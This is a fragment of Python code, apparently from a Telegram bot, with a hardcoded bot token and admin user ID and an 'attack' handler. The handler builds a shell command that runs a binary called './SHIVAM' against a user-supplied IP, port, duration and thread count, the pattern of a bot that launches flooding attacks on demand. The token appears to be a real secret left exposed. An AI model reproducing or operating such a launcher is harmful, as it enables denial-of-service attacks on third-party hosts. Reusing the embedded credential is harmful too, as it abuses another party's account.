...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '7790645600:AAHJ66_-QLhRfJ8_jAa-9nDzwNFyvsM5Am8'
ADMIN_USER_ID = 761789522 
ADMIN_USER_ID = 761789522 
...
async def attack(update: Update, context: CallbackContext):
    ...
    if argument_type == 3:
        attack_command = f"./SHIVAM {ip} {port} {duration}"
    elif argument_type == 4:
        attack_command = f"./SHIVAM {ip} {port} {duration} {threads}"
